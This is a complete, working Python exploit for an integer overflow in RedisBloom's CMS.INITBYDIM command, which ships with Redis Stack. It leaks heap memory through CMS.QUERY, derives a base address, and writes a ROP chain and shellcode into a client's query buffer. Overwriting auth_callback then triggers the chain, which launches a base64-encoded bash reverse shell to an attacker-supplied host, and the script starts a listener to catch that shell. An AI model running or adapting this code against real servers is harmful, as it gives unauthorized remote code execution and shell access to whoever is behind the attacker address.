#!/usr/bin/env python3
import pwn
import sys
import json
import threading
import time
import argparse
import base64
from types import SimpleNamespace


"""
Exploit for Redis Stack CMS.INITBYDIM Integer Overflow
Version: RedisBloom v2.6.12 shipped with Redis Stack 7.2.0-v10
Authors: @rick2600 and @gqsilva
Date: April 21th, 2024
"""


class ServerIsOffline(Exception):
    pass


class Client:
    def __init__(self, server=('127.0.0.1', 6379), password=None):
        self.host = server[0]
        self.port = server[1]
        self.password = password
        self.connection = None


    def connect(self):
        print(f"[*] Connecting to {self.host}:{self.port}")
        try:
            self.connection = pwn.remote(self.host, self.port)
            if self.password:
                self.sendline(f"AUTH {self.password}".encode())

        except pwn.pwnlib.exception.PwnlibException:
            raise ServerIsOffline


    def disconnect(self):
        if self.connection:
            self.connection.close()


    def sendline(self, command):
        try:
            self.connection.sendline(command)
            result = self.connection.recv(timeout=2)
            #print(result)
            return True, result #.replace(b"\r\n", b"\n")
        except EOFError:
            return False, None



class NestedNamespace(SimpleNamespace):
    def __init__(self, dictionary, **kwargs):
        super().__init__(**kwargs)
        for key, value in dictionary.items():
            if isinstance(value, dict):
                self.__setattr__(key, NestedNamespace(value))
            else:
                self.__setattr__(key, value)


def calloc(size):
    v = 0x4000000000000000 + size//4
    return v


def leak_buffer(key, start, end):
    buffer = b""
    for i in range(start, end):
        item = murmurhash2_input[i]
        success, result = client.sendline(f"CMS.QUERY {key} {item}".encode())
        a = result.split(b"\r\n")
        value = int(a[1][1:])
        buffer += pwn.p32(value)
    return buffer


def buffer_as_array(buffer, item_size=4):
    items = []
    for i in range(0, len(buffer), item_size):
        v = buffer[i:i+item_size]
        if item_size == 4:
            items.append(pwn.u32(v))
        if item_size == 8:
            items.append(pwn.u64(v))
    return items


def mem_dump(cms, size):
    out = ""
    buffer = leak_buffer(cms, 0, size)
    array_u32 = buffer_as_array(buffer, 4)
    for i in range(0, len(array_u32), 2):
        v32_lo = array_u32[i]
        v32_hi = array_u32[i+1]
        v64 = v32_hi << 32 | v32_lo
        out += f"[{i:3}: {hex(v32_lo):>10}, {i+1:3}: {hex(v32_hi):>10}] -> {hex(v64):>18}\n"
    return out


def load_murmurhash2_database():
    with open('./murmurhash2_1024.json', 'r') as json_file:
        data = json.load(json_file)
    return data



def initbydim(key, width, depth):
    cmd = f"CMS.INITBYDIM {key} {width} {depth}".encode()
    success, result = client.sendline(cmd)


def write_value(cms, at, value):
    lo = value & 0xffffffff
    hi = value >> 32
    cmd = f"CMS.INCRBY {cms} {murmurhash2_input[at]} {lo}".encode()
    success, result = client.sendline(cmd)

    if value > 0xffffffff:
        cmd = f"CMS.INCRBY {cms} {murmurhash2_input[at+1]} {hi}".encode()
        success, result = client.sendline(cmd)


def read_u32(cms, at, size=420):
    buffer = leak_buffer(cms, 0, size)
    arr = buffer_as_array(buffer, 4)
    return arr[at]


def read_u64(cms, at, size=420):
    buffer = leak_buffer(cms, 0, size)
    arr = buffer_as_array(buffer, 4)
    return (arr[at+1] << 32) | arr[at]


def parse_module_resp(lines):
    if lines[0].startswith(b"*"):
        cur = lines.pop(0)
        arr = []
        n = int(cur[1:])
        for i in range(n):
            elem = parse_module_resp(lines)
            arr.append(elem)
        return arr
    else:
        return lines.pop(0)


def modules_array_to_dict(arr):
    d = {}
    for i in range(0, len(arr), 2):
        k = arr[i].decode()
        if k == 'args':
            d[k] = [modules_array_to_dict(arr[i+1])]
        else:
            if isinstance(arr[i+1], list):
                d[k] = modules_array_to_dict(arr[i+1])
            else:
                if arr[i+1][0] == ord(b':'): arr[i+1] = arr[i+1][1:]
                d[k] = arr[i+1].decode()
    return d



def get_module_list():
    success, result = client.sendline(b"MODULE LIST")
    lines = result.split(b"\r\n")
    flattened = [line for line in lines if not line.startswith(b"$")]
    arr = parse_module_resp(flattened)
    return [modules_array_to_dict(e) for e in arr]


def print_modules_list():
    print("[*] Modules loaded")
    module_list = get_module_list()
    for m in module_list:
        name = m['name'].ljust(20)
        ver = m['ver'].ljust(10)
        path = m['path']
        print(f"    name: {name} - ver: {ver} - path: {path}")


# redis_version: 7.2.4
# bf: 2.6.12
def docker_redis70204_bf20612(args):
    global client, murmurhash2_input

    client = Client(server=(args.host, args.port), password=args.password)
    client.connect()

    #print_modules_list()

    cms = "cms_0"
    print("[*] Loading pre computed hashes")
    murmurhash2_input = load_murmurhash2_database()

    print("[*] Allocating evil CMS")
    initbydim(cms, calloc(0x310), 1)

    print("[*] Allocating client")
    client2 = Client(server=(args.host, args.port), password=args.password)
    client2.connect()
    client2.sendline(b"*1\r\n$4\r\nINFO\r\n") # needed for base leak (calculated from client->last_cmd)


    client_struct_start = 224
    auth_callback_offset = client_struct_start + 156
    c = NestedNamespace({
        'id':       read_u64(cms, client_struct_start +  0),
        'resp':     read_u64(cms, client_struct_start +  6),
        'db':       read_u64(cms, client_struct_start +  8),
        'querybuf': read_u64(cms, client_struct_start + 16),
        'lastcmd':  read_u64(cms, client_struct_start + 34)
    })

    base    = (c.lastcmd & 0xfffffffffffff000) - 0x379000
    """
    0x00000000000bc8f0 : mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x58]
    0x00000000001ee4a1 : mov rbx, rdi ; mov edi, 1 ; call qword ptr [rax + 8]
    0x00000000001928e0 : mov rcx, qword ptr [rbx + 8] ; mov rdx, rbp ; mov rsi, r12 ; call qword ptr [rbx + 0x10]
    0x000000000015f675 : push qword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
    0x00000000000787b2 : pop rdi ; ret
    0x000000000007cb50 : pop rsi ; ret
    0x000000000016df82 : pop rdx ; ret
    """
    gadget1         = base + 0x0bc8f0
    gadget2         = base + 0x1ee4a1
    gadget3         = base + 0x1928e0
    gadget4         = base + 0x15f675
    pop_rdi         = base + 0x0787b2
    pop_rsi         = base + 0x07cb50
    pop_rdx         = base + 0x16df82
    mprotect_plt    = base + 0x0762a0
    restartServer   = base + 0x09c5f0

    print(f"[*] Addresses")
    print(f"    Base address        at {hex(base)}")
    print(f"    gadget1             at {hex(gadget1)}")
    print(f"    gadget2             at {hex(gadget2)}")
    print(f"    gadget3             at {hex(gadget3)}")
    print(f"    gadget4             at {hex(gadget4)}")
    print(f"    mprotect_plt@plt    at {hex(mprotect_plt)}")
    print(f"    restartServer       at {hex(restartServer)}")

    bash_cmd = f'/bin/bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'.encode()
    #print(bash_cmd)
    encoded_cmd = base64.b64encode(bash_cmd)

    argv = [
        "/bin/sh\0".encode(),
        "-c\0".encode(),
        f"echo {encoded_cmd.decode()}|base64 -d|bash\0".encode()
    ]

    c_querybuf_aligned = (c.querybuf + c.id + 15) // 16 * 16
    cmd_addr = c_querybuf_aligned + 0x10 + 15*8 + 8*8
    shellcode_addr = cmd_addr + 256 + 4*8

    # fork (child: execve, parent: restartServer)
    shellcode = pwn.asm(f"""
        mov rax, 57
        syscall
        cmp rax, 0
        je child
        parent:
            mov rdi, 0
            mov rsi, 0
            mov rax, {restartServer}
            jmp rax
            mov rax, 60
            mov rdi, 0
            syscall
        child:
            mov rdi, {cmd_addr}
            mov rsi, {cmd_addr+256}
            mov rdx, 0
            mov rax, 59
            syscall
            mov rax, 60
            mov rdi, 0
            syscall
    """)

    rop =  b"\x00" * (c_querybuf_aligned - c.querybuf)          # pad
    rop += pwn.p64(c_querybuf_aligned + 0x10)
    rop += pwn.p64(c_querybuf_aligned + 0x10 + 12*8)            # rcx
    rop += pwn.p64(gadget4)
    rop += pwn.p64(gadget3)
    rop += pwn.p64(0) * (11 - 2)
    rop += pwn.p64(gadget2)
    rop += pwn.p64(c_querybuf_aligned + 0x10 + 15*8)            # rsp
    rop += pwn.p64(0) * 2 # pad
    rop += pwn.p64(pop_rdi)
    rop += pwn.p64(c_querybuf_aligned & 0xfffffffffffff000 )    # addr
    rop += pwn.p64(pop_rsi)
    rop += pwn.p64(0x1000*2)                                    # size
    rop += pwn.p64(pop_rdx)
    rop += pwn.p64(7)                                           # prot
    rop += pwn.p64(mprotect_plt)
    rop += pwn.p64(shellcode_addr)

    # setting up memory for execve
    rop += (argv[0] + argv[1] + argv[2]).ljust(256)
    rop += pwn.p64(cmd_addr)
    rop += pwn.p64(cmd_addr + len(argv[0]))
    rop += pwn.p64(cmd_addr + len(argv[0]) + len(argv[1]))
    rop += pwn.p64(0)

    client2.sendline(rop + shellcode)

    print(f"[*] Overwriting c->id")
    write_value(cms, client_struct_start, c_querybuf_aligned - c.id)

    print(f"[*] Overwriting c->auth_callback")
    write_value(cms, auth_callback_offset, gadget1)

    t = threading.Thread(target=shell_handler, args=(args.lport,))
    t.start()
    time.sleep(1)

    print(f"[*] Triggering RCE...")
    client2.disconnect()

    t.join()
    client.disconnect()


def shell_handler(lport):
    print("[*] Starting shell handler")
    l = pwn.listen(lport)
    _ = l.wait_for_connection()
    l.interactive()


def parse_args():
    parser = argparse.ArgumentParser(description='Redis-Stack Exploit')
    parser.add_argument('--host', type=str, default='127.0.0.1', help='Redis host')
    parser.add_argument('--port', type=int, default=6379, help='Redis port')
    parser.add_argument('--password', type=str, default=None, help='Redis password')
    parser.add_argument('--lhost', type=str, help='LHOST', required=True)
    parser.add_argument('--lport', type=str, help='LPORT', required=True)
    args = parser.parse_args()
    return args


def main():
    global client
    pwn.context.update({'os': 'linux', 'arch': 'amd64'})
    args = parse_args()
    docker_redis70204_bf20612(args)



if __name__ == '__main__':
    main()
